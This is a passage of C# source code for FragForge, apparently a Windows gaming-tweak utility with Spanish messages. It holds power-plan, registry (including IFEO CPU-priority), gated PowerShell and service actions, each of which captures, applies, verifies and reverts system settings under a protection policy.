        if (string.IsNullOrWhiteSpace(_parameters.PlanName) || _parameters.PlanName.Contains('(') || _parameters.PlanName.Contains(')') || _parameters.PlanName.Length > 80) throw new CatalogValidationException("Invalid power plan name.", [_parameters.PlanName]);
        if (!Guid.TryParseExact(_parameters.SourceSchemeGuid, "D", out _)) throw new CatalogValidationException("Invalid source scheme GUID.", [_parameters.SourceSchemeGuid]);
        if (_parameters.Settings.Count == 0) throw new CatalogValidationException("Power plan requires settings.", ["settings"]);
        foreach (var setting in _parameters.Settings)
        {
            if (!Guid.TryParseExact(setting.SubgroupGuid, "D", out _) || !Guid.TryParseExact(setting.SettingGuid, "D", out _) || setting.AcValue is < 0 or > 100 || setting.DcValue is < 0 or > 100) throw new CatalogValidationException("Invalid power setting GUID or percentage.", [setting.SettingGuid]);
        }
    }
    private async Task<IReadOnlyList<(string Guid, string Name)>> ListPlansAsync(CancellationToken cancellationToken)
    {
        var result = await RunAsync(["/list"], cancellationToken);
        return Regex.Matches(result.StandardOutput, @"([0-9a-fA-F]{8}-[0-9a-fA-F]{4}-[0-9a-fA-F]{4}-[0-9a-fA-F]{4}-[0-9a-fA-F]{12})\s+\(([^)]*)\)").Select(m => (m.Groups[1].Value.ToLowerInvariant(), m.Groups[2].Value.Trim())).ToArray();
    }
    private async Task<string> GetActivePlanAsync(CancellationToken cancellationToken)
    {
        var result = await RunAsync(["/getactivescheme"], cancellationToken);
        var match = Regex.Match(result.StandardOutput, @"([0-9a-fA-F]{8}-[0-9a-fA-F]{4}-[0-9a-fA-F]{4}-[0-9a-fA-F]{4}-[0-9a-fA-F]{12})\s+\((Active|Current|[^)]*)\)", RegexOptions.IgnoreCase);
        return match.Success ? match.Groups[1].Value.ToLowerInvariant() : ParseGuid(result, "active power scheme");
    }
    private (string Guid, string Name)? FindPlan(IReadOnlyList<(string Guid, string Name)> plans)
    {
        var matches = plans.Where(p => p.Name.Equals(_parameters.PlanName, StringComparison.OrdinalIgnoreCase)).ToArray();
        if (matches.Length > 1) throw new FragForgeException("ambiguous_power_plan", $"Hay varios planes llamados '{_parameters.PlanName}'.");
        return matches.Length == 0 ? null : matches[0];
    }
    private async Task<PowerSettingCapture> QuerySettingAsync(string planGuid, string subgroupGuid, string settingGuid, CancellationToken cancellationToken)
    {
        var result = await RunAsync(["/query", planGuid, subgroupGuid, settingGuid], cancellationToken);
        var indices = Regex.Matches(result.StandardOutput, @"0x([0-9a-fA-F]+)\s*$", RegexOptions.Multiline).Select(m => int.Parse(m.Groups[1].Value, NumberStyles.HexNumber, CultureInfo.InvariantCulture)).ToArray();
        if (indices.Length < 2) throw new ActionNotApplicableException($"No se pudieron leer los índices AC/DC de {settingGuid}.");
        return new PowerSettingCapture(subgroupGuid, settingGuid, indices[^2], indices[^1]);
    }
    private async Task<ProcessResult> RunAsync(IReadOnlyList<string> arguments, CancellationToken cancellationToken)
    {
        var result = await RunPowerCfgAsync(arguments, cancellationToken);
        if (!result.IsSuccess) throw new ProcessFailedException("powercfg.exe", result.ExitCode, result.TimedOut ? "timeout" : result.StandardError + result.StandardOutput);
        return result;
    }
    private static string ParseGuid(ProcessResult result, string context) => Regex.Match(result.StandardOutput, @"[0-9a-fA-F]{8}-[0-9a-fA-F]{4}-[0-9a-fA-F]{4}-[0-9a-fA-F]{4}-[0-9a-fA-F]{12}").Value is var guid && Guid.TryParseExact(guid, "D", out _) ? guid.ToLowerInvariant() : throw new InvalidDataException($"No GUID found in {context} output.");
}
internal sealed record PowerPlanParameters
{
    public string PlanName { get; init; } = "FragForge Performance";
    public string SourceSchemeGuid { get; init; } = "8c5e7fda-e8bf-4a96-9a85-a6e23a8c635c";
    public bool Activate { get; init; } = true;
    public IReadOnlyList<PowerPlanTarget> Settings { get; init; } = [];
}
public sealed record PowerPlanTarget
{
    public required string SubgroupGuid { get; init; }
    public required string SettingGuid { get; init; }
    public int AcValue { get; init; }
    public int DcValue { get; init; }
}
````

### `src/FragForge.Actions/Registry/IfeoPerfOptionsAction.cs`  <sub>(27 líneas)</sub>

````csharp
using System.Text.Json;
using FragForge.Core.Abstractions;
using FragForge.Core.Models;

namespace FragForge.Actions.Registry;

public sealed class IfeoPerfOptionsAction : ITweakAction
{
    private readonly RegistryAction _inner;
    public string Kind => "IfeoPerfOptions";
    public IfeoPerfOptionsAction(IRegistry registry, IProtectionPolicy policy, ActionSpec specification)
    {
        var p = ActionParameters.Parse<IfeoParameters>(specification);
        if (string.IsNullOrWhiteSpace(p.ImageName) || p.ImageName.Contains('\\') || p.ImageName.Contains('/') || p.ImageName.Contains('*') || p.ImageName.Contains('?')) throw new CatalogValidationException("IFEO requires an exact image file name.", [p.ImageName]);
        if (p.PriorityClass is not (1 or 2 or 3 or 5 or 6)) throw new CatalogValidationException("Realtime (4) and unknown CPU priority classes are forbidden.", [p.PriorityClass.ToString()]);
        var parameters = new RegistryActionParameters { Values = [new RegistryValueTarget { Key = $@"HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\{p.ImageName}\PerfOptions", Name = "CpuPriorityClass", Kind = "DWord", Value = JsonSerializer.SerializeToElement(p.PriorityClass) }] };
        _inner = new RegistryAction(registry, policy, parameters);
    }
    public Task PreflightAsync(ActionExecutionContext c, CancellationToken t = default) => _inner.PreflightAsync(c, t);
    public Task<ActionState> CaptureAsync(ActionExecutionContext c, CancellationToken t = default) => _inner.CaptureAsync(c, t);
    public Task ApplyAsync(ActionState s, ActionExecutionContext c, CancellationToken t = default) => _inner.ApplyAsync(s, c, t);
    public Task<VerificationResult> VerifyAsync(ActionState s, ActionExecutionContext c, CancellationToken t = default) => _inner.VerifyAsync(s, c, t);
    public Task RevertAsync(ActionState s, ActionExecutionContext c, CancellationToken t = default) => _inner.RevertAsync(s, c, t);
    public Task<VerificationResult> VerifyRevertAsync(ActionState s, ActionExecutionContext c, CancellationToken t = default) => _inner.VerifyRevertAsync(s, c, t);
    public Task<string> DryRunAsync(ActionExecutionContext c, CancellationToken t = default) => _inner.DryRunAsync(c, t);
}
internal sealed record IfeoParameters { public string ImageName { get; init; } = "cs2.exe"; public int PriorityClass { get; init; } = 3; }
````

### `src/FragForge.Actions/Registry/ProtectedRegistry.cs`  <sub>(14 líneas)</sub>

````csharp
using FragForge.Core.Abstractions;

namespace FragForge.Actions.Registry;

public sealed class ProtectedRegistry(IRegistry inner, IProtectionPolicy policy) : IRegistry
{
    public Task<bool> KeyExistsAsync(string key, CancellationToken cancellationToken = default) => inner.KeyExistsAsync(key, cancellationToken);
    public Task<RegistryReadResult> ReadValueAsync(string key, string name, CancellationToken cancellationToken = default) => inner.ReadValueAsync(key, name, cancellationToken);
    public Task<IReadOnlyList<string>> GetValueNamesAsync(string key, CancellationToken cancellationToken = default) => inner.GetValueNamesAsync(key, cancellationToken);
    public Task<IReadOnlyList<string>> GetSubKeyNamesAsync(string key, CancellationToken cancellationToken = default) => inner.GetSubKeyNamesAsync(key, cancellationToken);
    public Task WriteValueAsync(string key, string name, RegistryWriteValue value, CancellationToken cancellationToken = default) { policy.EnsureRegistryAllowed(key, name); return inner.WriteValueAsync(key, name, value, cancellationToken); }
    public Task DeleteValueAsync(string key, string name, CancellationToken cancellationToken = default) { policy.EnsureRegistryAllowed(key, name); return inner.DeleteValueAsync(key, name, cancellationToken); }
    public Task DeleteEmptySubKeyAsync(string parentKey, string childName, CancellationToken cancellationToken = default) { policy.EnsureRegistryAllowed(parentKey + "\\" + childName); return inner.DeleteEmptySubKeyAsync(parentKey, childName, cancellationToken); }
}
````

### `src/FragForge.Actions/Registry/RegistryAction.cs`  <sub>(144 líneas)</sub>

````csharp
using FragForge.Core.Abstractions;
using FragForge.Core.Models;
using FragForge.Core.Persistence;

namespace FragForge.Actions.Registry;

public class RegistryAction : ITweakAction
{
    private readonly IRegistry _registry;
    private readonly IProtectionPolicy _policy;
    private readonly RegistryActionParameters _parameters;
    public virtual string Kind => "Registry";
    public RegistryAction(IRegistry registry, IProtectionPolicy policy, ActionSpec specification)
    {
        _registry = registry;
        _policy = policy;
        _parameters = ActionParameters.Parse<RegistryActionParameters>(specification);
        if (_parameters.Values.Count == 0) throw new CatalogValidationException("Registry action requires at least one value.", ["values"]);
        foreach (var value in _parameters.Values)
        {
            RegistryPath.Canonicalize(value.Key);
            if (!RegistryValueConverter.SupportedKinds.Contains(value.Kind)) throw new CatalogValidationException($"Unsupported registry kind '{value.Kind}'.", [value.Kind]);
            if (value.Mode is not ("Set" or "AddToken")) throw new CatalogValidationException($"Unsupported registry mode '{value.Mode}'.", [value.Mode]);
            if (value.Mode == "AddToken" && (value.Kind != "String" || value.Value.ValueKind != System.Text.Json.JsonValueKind.String || string.IsNullOrWhiteSpace(value.Value.GetString()) || value.Value.GetString()!.Contains('\n'))) throw new CatalogValidationException("AddToken requires a single-line String token.", [value.Name]);
            RegistryValueConverter.FromJson(value.Kind, value.Value);
            policy.EnsureRegistryAllowed(value.Key, value.Name);
        }
    }
    internal RegistryAction(IRegistry registry, IProtectionPolicy policy, RegistryActionParameters parameters)
    {
        _registry = registry; _policy = policy; _parameters = parameters;
        foreach (var value in parameters.Values) policy.EnsureRegistryAllowed(value.Key, value.Name);
    }
    public Task PreflightAsync(ActionExecutionContext context, CancellationToken cancellationToken = default)
    {
        cancellationToken.ThrowIfCancellationRequested();
        foreach (var target in _parameters.Values)
        {
            var key = RegistryPath.ResolveUserHive(ActionParameters.ResolveToken(target.Key, context), context.TargetUserSid);
            var name = ActionParameters.ResolveToken(target.Name, context);
            _policy.EnsureRegistryAllowed(key, name);
        }
        return Task.CompletedTask;
    }
    public async Task<ActionState> CaptureAsync(ActionExecutionContext context, CancellationToken cancellationToken = default)
    {
        var captures = new List<RegistryValueCapture>();
        foreach (var target in ResolveTargets(context))
        {
            cancellationToken.ThrowIfCancellationRequested();
            var result = await _registry.ReadValueAsync(target.Key, target.Name, cancellationToken);
            var missing = new List<string>();
            foreach (var ancestor in RegistryPath.AncestorsFromRoot(target.Key))
                if (!await _registry.KeyExistsAsync(ancestor, cancellationToken)) missing.Add(ancestor);
            captures.Add(RegistryValueConverter.Capture(target.Key, target.Name, result, missing));
        }
        context.Report("capture", 0.25, $"{captures.Count} valores capturados, incluidos ausentes.");
        return new RegistryActionState { Values = captures };
    }
    public async Task ApplyAsync(ActionState before, ActionExecutionContext context, CancellationToken cancellationToken = default)
    {
        if (before is not RegistryActionState state) throw new ArgumentException("Registry snapshot required.", nameof(before));
        var targets = ResolveTargets(context);
        for (var i = 0; i < targets.Count; i++)
        {
            cancellationToken.ThrowIfCancellationRequested();
            var target = targets[i];
            var desired = RegistryValueConverter.FromJson(target.Spec.Kind, target.Spec.Value);
            if (target.Spec.Mode == "AddToken")
            {
                var current = await _registry.ReadValueAsync(target.Key, target.Name, cancellationToken);
                var original = current.ValueExists && current.Kind == "String" ? current.Data as string ?? "" : "";
                var token = desired.Data as string ?? throw new InvalidOperationException("Token missing.");
                if (HasToken(original, token)) continue;
                desired = new RegistryWriteValue("String", original.Length == 0 ? token : original + (original.EndsWith(' ') ? "" : " ") + token);
            }
            await _registry.WriteValueAsync(target.Key, target.Name, desired, cancellationToken);
            context.Report("apply", (double)(i + 1) / targets.Count, $"{target.Key}\\{target.Name} escrito.");
        }
    }
    public async Task<VerificationResult> VerifyAsync(ActionState before, ActionExecutionContext context, CancellationToken cancellationToken = default)
    {
        if (before is not RegistryActionState state) return new(VerificationOutcome.Unknown, "Snapshot de registro inválido.");
        var targets = ResolveTargets(context);
        var matches = 0;
        var messages = new List<string>();
        for (var i = 0; i < targets.Count; i++)
        {
            cancellationToken.ThrowIfCancellationRequested();
            var target = targets[i];
            var current = await _registry.ReadValueAsync(target.Key, target.Name, cancellationToken);
            var desired = RegistryValueConverter.FromJson(target.Spec.Kind, target.Spec.Value);
            bool ok;
            if (target.Spec.Mode == "AddToken")
            {
                var token = (string)desired.Data;
                var original = state.Values[i].ValueExisted ? state.Values[i].StringData ?? "" : "";
                ok = current.ValueExists && current.Kind == "String" && current.Data is string text && HasToken(text, token) && (original.Length == 0 || text.StartsWith(original, StringComparison.Ordinal));
            }
            else ok = RegistryValueConverter.DataEqual(desired, current);
            if (ok) matches++; else messages.Add($"{target.Key}\\{target.Name} no coincide.");
        }
        return matches == targets.Count ? VerificationResult.Match($"Registro: {matches}/{targets.Count} valores coinciden.") : new VerificationResult(matches == 0 ? VerificationOutcome.DoesNotMatch : VerificationOutcome.Partial, string.Join(" ", messages));
    }
    public async Task RevertAsync(ActionState before, ActionExecutionContext context, CancellationToken cancellationToken = default)
    {
        if (before is not RegistryActionState state) throw new ArgumentException("Registry snapshot required.", nameof(before));
        foreach (var capture in state.Values.AsEnumerable().Reverse())
        {
            cancellationToken.ThrowIfCancellationRequested();
            _policy.EnsureRegistryAllowed(capture.Key, capture.Name);
            if (capture.ValueExisted) await _registry.WriteValueAsync(capture.Key, capture.Name, RegistryValueConverter.ToWriteValue(capture), cancellationToken);
            else await _registry.DeleteValueAsync(capture.Key, capture.Name, cancellationToken);
            foreach (var missing in capture.MissingAncestors)
            {
                var parent = missing[..missing.LastIndexOf('\\')];
                var child = missing[(missing.LastIndexOf('\\') + 1)..];
                _policy.EnsureRegistryAllowed(missing);
                await _registry.DeleteEmptySubKeyAsync(parent, child, cancellationToken);
            }
        }
        context.Report("revert", 1, "Registro restaurado exactamente; valores ausentes eliminados.");
    }
    public async Task<VerificationResult> VerifyRevertAsync(ActionState before, ActionExecutionContext context, CancellationToken cancellationToken = default)
    {
        var after = await CaptureAsync(context, cancellationToken);
        return Core.Engine.ActionStateEquivalence.Equivalent(before, after) ? VerificationResult.Match("Registro idéntico al estado capturado.") : VerificationResult.Missing("El registro no volvió exactamente al estado capturado.");
    }
    public async Task<string> DryRunAsync(ActionExecutionContext context, CancellationToken cancellationToken = default)
    {
        var lines = new List<string>();
        foreach (var target in ResolveTargets(context))
        {
            cancellationToken.ThrowIfCancellationRequested();
            var current = await _registry.ReadValueAsync(target.Key, target.Name, cancellationToken);
            var desired = RegistryValueConverter.FromJson(target.Spec.Kind, target.Spec.Value);
            var previous = current.ValueExists ? $"{current.Kind}={current.Data}" : "(no existía)";
            lines.Add($"{target.Key}\\{target.Name}: {previous} -> {target.Spec.Kind}={RegistryValueConverter.Describe(desired)} ({target.Spec.Mode}); revert restaura el valor previo o lo elimina.");
        }
        return string.Join(Environment.NewLine, lines);
    }
    private IReadOnlyList<(string Key, string Name, RegistryValueTarget Spec)> ResolveTargets(ActionExecutionContext context) => _parameters.Values.Select(v => (RegistryPath.ResolveUserHive(ActionParameters.ResolveToken(v.Key, context), context.TargetUserSid), ActionParameters.ResolveToken(v.Name, context), v)).ToArray();
    private static bool HasToken(string value, string token) => value.Split(' ', StringSplitOptions.RemoveEmptyEntries).Contains(token, StringComparer.Ordinal);
}
````

### `src/FragForge.Actions/Registry/RegistryValueConverter.cs`  <sub>(61 líneas)</sub>

````csharp
using System.Text.Json;
using FragForge.Core.Abstractions;
using FragForge.Core.Models;

namespace FragForge.Actions.Registry;

public static class RegistryValueConverter
{
    public static readonly IReadOnlySet<string> SupportedKinds = new HashSet<string>(StringComparer.Ordinal) { "String", "ExpandString", "DWord", "QWord", "Binary", "MultiString" };
    public static RegistryWriteValue FromJson(string kind, JsonElement value)
    {
        if (!SupportedKinds.Contains(kind)) throw new CatalogValidationException($"Unsupported registry kind '{kind}'.", [kind]);
        object data = kind switch
        {
            "String" or "ExpandString" => value.ValueKind == JsonValueKind.String ? value.GetString()! : throw new JsonException("Expected string."),
            "DWord" => value.TryGetInt32(out var i) ? i : throw new JsonException("Expected Int32."),
            "QWord" => value.TryGetInt64(out var l) ? l : throw new JsonException("Expected Int64."),
            "Binary" => Convert.FromBase64String(value.GetString() ?? throw new JsonException("Expected base64 string.")),
            "MultiString" => value.ValueKind == JsonValueKind.Array ? value.EnumerateArray().Select(x => x.GetString() ?? throw new JsonException("Null string in array.")).ToArray() : throw new JsonException("Expected string array."),
            _ => throw new JsonException("Unsupported kind.")
        };
        return new RegistryWriteValue(kind, data);
    }
    public static RegistryValueCapture Capture(string key, string name, RegistryReadResult result, IReadOnlyList<string> missingAncestors) => new()
    {
        Key = key, Name = name, KeyExisted = result.KeyExists, ValueExisted = result.ValueExists, ValueKind = result.Kind,
        StringData = result.Data as string,
        IntegerData = result.Data is int i ? i : result.Data is long l ? l : null,
        MultiStringData = result.Data is string[] strings ? strings : null,
        BinaryBase64 = result.Data is byte[] bytes ? Convert.ToBase64String(bytes) : null,
        MissingAncestors = missingAncestors
    };
    public static RegistryWriteValue ToWriteValue(RegistryValueCapture capture) => capture.ValueKind switch
    {
        "String" or "ExpandString" => new(capture.ValueKind, capture.StringData ?? ""),
        "DWord" => new(capture.ValueKind, unchecked((int)(capture.IntegerData ?? 0))),
        "QWord" => new(capture.ValueKind, capture.IntegerData ?? 0L),
        "Binary" => new(capture.ValueKind, Convert.FromBase64String(capture.BinaryBase64 ?? "")),
        "MultiString" => new(capture.ValueKind, (capture.MultiStringData ?? []).ToArray()),
        _ => throw new InvalidDataException($"No se puede restaurar el tipo '{capture.ValueKind}'.")
    };
    public static bool DataEqual(RegistryWriteValue expected, RegistryReadResult actual)
    {
        if (!actual.ValueExists || !string.Equals(expected.Kind, actual.Kind, StringComparison.Ordinal)) return false;
        return expected.Data switch
        {
            string s => actual.Data is string a && s == a,
            int i => actual.Data is int ai && i == ai,
            long l => actual.Data is long al && l == al,
            byte[] b => actual.Data is byte[] ab && b.AsSpan().SequenceEqual(ab),
            string[] s => actual.Data is string[] aa && s.SequenceEqual(aa),
            _ => false
        };
    }
    public static string Describe(RegistryWriteValue value) => value.Data switch
    {
        byte[] bytes => Convert.ToBase64String(bytes),
        string[] strings => string.Join(" | ", strings),
        _ => Convert.ToString(value.Data, System.Globalization.CultureInfo.InvariantCulture) ?? ""
    };
}
````

### `src/FragForge.Actions/Registry/UnsupportedRegistry.cs`  <sub>(15 líneas)</sub>

````csharp
using FragForge.Core.Abstractions;

namespace FragForge.Actions.Registry;

public sealed class UnsupportedRegistry : IRegistry
{
    private static T Fail<T>() => throw new PlatformNotSupportedException("El registro de Windows no está disponible en esta plataforma.");
    public Task<bool> KeyExistsAsync(string key, CancellationToken cancellationToken = default) => Task.FromResult(false);
    public Task<RegistryReadResult> ReadValueAsync(string key, string name, CancellationToken cancellationToken = default) => Task.FromResult(new RegistryReadResult(false, false, null, null));
    public Task<IReadOnlyList<string>> GetValueNamesAsync(string key, CancellationToken cancellationToken = default) => Task.FromResult<IReadOnlyList<string>>([]);
    public Task<IReadOnlyList<string>> GetSubKeyNamesAsync(string key, CancellationToken cancellationToken = default) => Task.FromResult<IReadOnlyList<string>>([]);
    public Task WriteValueAsync(string key, string name, RegistryWriteValue value, CancellationToken cancellationToken = default) => Fail<Task>();
    public Task DeleteValueAsync(string key, string name, CancellationToken cancellationToken = default) => Fail<Task>();
    public Task DeleteEmptySubKeyAsync(string parentKey, string childName, CancellationToken cancellationToken = default) => Fail<Task>();
}
````

### `src/FragForge.Actions/Registry/WindowsRegistry.cs`  <sub>(86 líneas)</sub>

````csharp
using System.Runtime.Versioning;
using FragForge.Core.Abstractions;
using FragForge.Core.Persistence;
using Microsoft.Win32;

namespace FragForge.Actions.Registry;

[SupportedOSPlatform("windows")]
public sealed class WindowsRegistry : IRegistry
{
    public Task<bool> KeyExistsAsync(string key, CancellationToken cancellationToken = default)
    {
        cancellationToken.ThrowIfCancellationRequested();
        var (hive, path) = Split(key);
        using var root = RegistryKey.OpenBaseKey(hive, RegistryView.Registry64);
        using var subkey = root.OpenSubKey(path);
        return Task.FromResult(subkey is not null);
    }
    public Task<RegistryReadResult> ReadValueAsync(string key, string name, CancellationToken cancellationToken = default)
    {
        cancellationToken.ThrowIfCancellationRequested();
        var (hive, path) = Split(key);
        using var root = RegistryKey.OpenBaseKey(hive, RegistryView.Registry64);
        using var subkey = root.OpenSubKey(path);
        if (subkey is null) return Task.FromResult(new RegistryReadResult(false, false, null, null));
        var data = subkey.GetValue(name, null, RegistryValueOptions.DoNotExpandEnvironmentNames);
        return Task.FromResult(data is null ? new RegistryReadResult(true, false, null, null) : new RegistryReadResult(true, true, subkey.GetValueKind(name).ToString(), data));
    }
    public Task<IReadOnlyList<string>> GetValueNamesAsync(string key, CancellationToken cancellationToken = default)
    {
        cancellationToken.ThrowIfCancellationRequested();
        var (hive, path) = Split(key);
        using var root = RegistryKey.OpenBaseKey(hive, RegistryView.Registry64);
        using var subkey = root.OpenSubKey(path);
        return Task.FromResult<IReadOnlyList<string>>(subkey?.GetValueNames() ?? []);
    }
    public Task<IReadOnlyList<string>> GetSubKeyNamesAsync(string key, CancellationToken cancellationToken = default)
    {
        cancellationToken.ThrowIfCancellationRequested();
        var (hive, path) = Split(key);
        using var root = RegistryKey.OpenBaseKey(hive, RegistryView.Registry64);
        using var subkey = root.OpenSubKey(path);
        return Task.FromResult<IReadOnlyList<string>>(subkey?.GetSubKeyNames() ?? []);
    }
    public Task WriteValueAsync(string key, string name, RegistryWriteValue value, CancellationToken cancellationToken = default)
    {
        cancellationToken.ThrowIfCancellationRequested();
        var (hive, path) = Split(key);
        using var root = RegistryKey.OpenBaseKey(hive, RegistryView.Registry64);
        using var subkey = root.CreateSubKey(path, true);
        subkey.SetValue(name, value.Data, Enum.Parse<RegistryValueKind>(value.Kind));
        subkey.Flush();
        return Task.CompletedTask;
    }
    public Task DeleteValueAsync(string key, string name, CancellationToken cancellationToken = default)
    {
        cancellationToken.ThrowIfCancellationRequested();
        var (hive, path) = Split(key);
        using var root = RegistryKey.OpenBaseKey(hive, RegistryView.Registry64);
        using var subkey = root.OpenSubKey(path, true);
        subkey?.DeleteValue(name, false);
        subkey?.Flush();
        return Task.CompletedTask;
    }
    public Task DeleteEmptySubKeyAsync(string parentKey, string childName, CancellationToken cancellationToken = default)
    {
        cancellationToken.ThrowIfCancellationRequested();
        var (hive, path) = Split(parentKey);
        using var root = RegistryKey.OpenBaseKey(hive, RegistryView.Registry64);
        using var parent = root.OpenSubKey(path, true);
        if (parent is null) return Task.CompletedTask;
        using var child = parent.OpenSubKey(childName);
        if (child is null || child.SubKeyCount != 0 || child.ValueCount != 0) return Task.CompletedTask;
        parent.DeleteSubKey(childName, false);
        parent.Flush();
        return Task.CompletedTask;
    }
    private static (RegistryHive Hive, string Path) Split(string key)
    {
        var canonical = RegistryPath.Canonicalize(key);
        var index = canonical.IndexOf('\\');
        var root = index < 0 ? canonical : canonical[..index];
        var path = index < 0 ? "" : canonical[(index + 1)..];
        return (root switch { "HKLM" => RegistryHive.LocalMachine, "HKU" => RegistryHive.Users, "HKCU" => RegistryHive.CurrentUser, "HKCR" => RegistryHive.ClassesRoot, "HKCC" => RegistryHive.CurrentConfig, _ => throw new ArgumentException("Unsupported registry root.") }, path);
    }
}
````

### `src/FragForge.Actions/Scripting/PowerShellAction.cs`  <sub>(91 líneas)</sub>

````csharp
using System.Security.Cryptography;
using System.Text;
using System.Text.Json;
using FragForge.Core.Abstractions;
using FragForge.Core.Logging;
using FragForge.Core.Models;

namespace FragForge.Actions.Scripting;

public sealed class PowerShellAction(IProcessRunner runner, IProtectionPolicy policy, ActionSpec specification) : ITweakAction
{
    private readonly PowerShellParameters _parameters = ActionParameters.Parse<PowerShellParameters>(specification);
    public string Kind => "PowerShell";
    public Task PreflightAsync(ActionExecutionContext context, CancellationToken cancellationToken = default)
    {
        if (!context.AllowPowerShellActions) throw new ProtectedTargetException("PowerShell", "deshabilitado por defecto; requiere AllowPowerShellActions y doble confirmación Advanced");
        Validate();
        foreach (var script in Scripts()) policy.EnsurePowerShellAllowed(script);
        return Task.CompletedTask;
    }
    public async Task<ActionState> CaptureAsync(ActionExecutionContext context, CancellationToken cancellationToken = default)
    {
        EnsureAllowed(context);
        var result = await RunAsync(_parameters.CaptureScript, null, cancellationToken);
        using var document = JsonDocument.Parse(result.StandardOutput.TrimStart('\uFEFF'));
        if (document.RootElement.ValueKind is not (JsonValueKind.Object or JsonValueKind.Array)) throw new InvalidDataException("CaptureScript must return a JSON object or array.");
        return new ScriptActionState { ScriptSha256 = HashScripts(), CapturedJson = document.RootElement.Clone() };
    }
    public async Task ApplyAsync(ActionState before, ActionExecutionContext context, CancellationToken cancellationToken = default)
    {
        EnsureAllowed(context);
        var state = (ScriptActionState)before;
        EnsureHash(state);
        await RunAsync(_parameters.ApplyScript, JsonSerializer.Serialize(state.CapturedJson, JsonDefaults.Create(false)), cancellationToken);
    }
    public async Task<VerificationResult> VerifyAsync(ActionState before, ActionExecutionContext context, CancellationToken cancellationToken = default)
    {
        EnsureAllowed(context);
        var state = (ScriptActionState)before;
        var result = await RunAsync(_parameters.VerifyScript, JsonSerializer.Serialize(state.CapturedJson, JsonDefaults.Create(false)), cancellationToken);
        using var document = JsonDocument.Parse(result.StandardOutput.TrimStart('\uFEFF'));
        var matches = document.RootElement.GetProperty("matches").GetBoolean();
        var message = document.RootElement.TryGetProperty("message", out var m) ? m.GetString() ?? "" : "Script verification.";
        return matches ? VerificationResult.Match(message) : VerificationResult.Missing(message);
    }
    public async Task RevertAsync(ActionState before, ActionExecutionContext context, CancellationToken cancellationToken = default)
    {
        EnsureAllowed(context);
        var state = (ScriptActionState)before;
        EnsureHash(state);
        await RunAsync(_parameters.RevertScript, JsonSerializer.Serialize(state.CapturedJson, JsonDefaults.Create(false)), cancellationToken);
    }
    public async Task<VerificationResult> VerifyRevertAsync(ActionState before, ActionExecutionContext context, CancellationToken cancellationToken = default)
    {
        var after = await CaptureAsync(context, cancellationToken);
        return Core.Engine.ActionStateEquivalence.Equivalent(before, after) ? VerificationResult.Match("El script de captura volvió al JSON original.") : VerificationResult.Missing("El script de captura no reproduce el estado original.");
    }
    public Task<string> DryRunAsync(ActionExecutionContext context, CancellationToken cancellationToken = default)
    {
        EnsureAllowed(context);
        return Task.FromResult($"PowerShell local explícito (Experimental/Advanced), SHA256={HashScripts()}. Captura/aplica/verifica/revertir con JSON por stdin. No se descarga código.\nAplicación:\n{_parameters.ApplyScript}\nReversión:\n{_parameters.RevertScript}");
    }
    private void EnsureAllowed(ActionExecutionContext context)
    {
        if (!context.AllowPowerShellActions) throw new ProtectedTargetException("PowerShell", "acción no habilitada");
        Validate();
        foreach (var script in Scripts()) policy.EnsurePowerShellAllowed(script);
    }
    private void EnsureHash(ScriptActionState state) { if (state.ScriptSha256 != HashScripts()) throw new FragForgeException("script_changed", "Los scripts difieren de la captura persistida."); }
    private void Validate()
    {
        if (Scripts().Any(string.IsNullOrWhiteSpace)) throw new CatalogValidationException("PowerShell requires capture/apply/verify/revert scripts.", ["scripts"]);
        if (_parameters.TimeoutSeconds is <= 0 or > 300) throw new CatalogValidationException("PowerShell timeout must be 1..300 seconds.", [_parameters.TimeoutSeconds.ToString()]);
    }
    private IEnumerable<string> Scripts() => [_parameters.CaptureScript, _parameters.ApplyScript, _parameters.VerifyScript, _parameters.RevertScript];
    private string HashScripts() => Convert.ToHexString(SHA256.HashData(Encoding.UTF8.GetBytes(JsonSerializer.Serialize(Scripts().ToArray(), JsonDefaults.Create(false))))).ToLowerInvariant();
    private async Task<ProcessResult> RunAsync(string script, string? input, CancellationToken cancellationToken)
    {
        var result = await runner.RunAsync(new ProcessRequest { FileName = Platform.ProcessRunner.SystemExecutable(@"WindowsPowerShell\v1.0\powershell.exe"), Arguments = ["-NoProfile", "-NonInteractive", "-ExecutionPolicy", "Bypass", "-Command", "[Console]::OutputEncoding=[System.Text.UTF8Encoding]::new(); " + script], StandardInput = input, Timeout = TimeSpan.FromSeconds(_parameters.TimeoutSeconds) }, cancellationToken);
        if (!result.IsSuccess) throw new ProcessFailedException("powershell.exe", result.ExitCode, result.TimedOut ? "timeout" : result.StandardError);
        return result;
    }
}
internal sealed record PowerShellParameters
{
    public string CaptureScript { get; init; } = "";
    public string ApplyScript { get; init; } = "";
    public string VerifyScript { get; init; } = "";
    public string RevertScript { get; init; } = "";
    public int TimeoutSeconds { get; init; } = 60;
}
````

### `src/FragForge.Actions/Services/ServiceAction.cs`  <sub>(50 líneas)</sub>

````csharp
using FragForge.Core.Abstractions;
using FragForge.Core.Models;

namespace FragForge.Actions.Services;

public sealed class ServiceAction : ITweakAction
{
    private readonly IServiceController _controller;
    private readonly IProtectionPolicy _policy;
    private readonly ServiceParameters _parameters;
    public string Kind => "Service";
    public ServiceAction(IServiceController controller, IProtectionPolicy policy, ActionSpec specification)
    {
        _controller = controller; _policy = policy; _parameters = ActionParameters.Parse<ServiceParameters>(specification);
        if (string.IsNullOrWhiteSpace(_parameters.Name)) throw new CatalogValidationException("Service name is required.", ["name"]);
        if (_parameters.StartMode is not null and not ("Auto" or "Manual" or "Disabled")) throw new CatalogValidationException("Invalid service start mode.", [_parameters.StartMode]);
        if (_parameters.State is not null and not ("Running" or "Stopped")) throw new CatalogValidationException("Invalid service state.", [_parameters.State]);
        if (_parameters.StartMode is null && _parameters.State is null && _parameters.DelayedAutoStart is null) throw new CatalogValidationException("Service action has no target.", ["empty"]);
        _policy.EnsureServiceAllowed(_parameters.Name);
    }
    public async Task PreflightAsync(ActionExecutionContext context, CancellationToken cancellationToken = default)
    {
        _policy.EnsureServiceAllowed(_parameters.Name);
        var current = await _controller.GetAsync(_parameters.Name, cancellationToken);
        if (!current.Exists) throw new ActionNotApplicableException($"El servicio {_parameters.Name} no existe.");
    }
    public async Task<ActionState> CaptureAsync(ActionExecutionContext context, CancellationToken cancellationToken = default) => new ServiceActionState { Service = await _controller.GetAsync(_parameters.Name, cancellationToken) };
    public async Task ApplyAsync(ActionState before, ActionExecutionContext context, CancellationToken cancellationToken = default)
    {
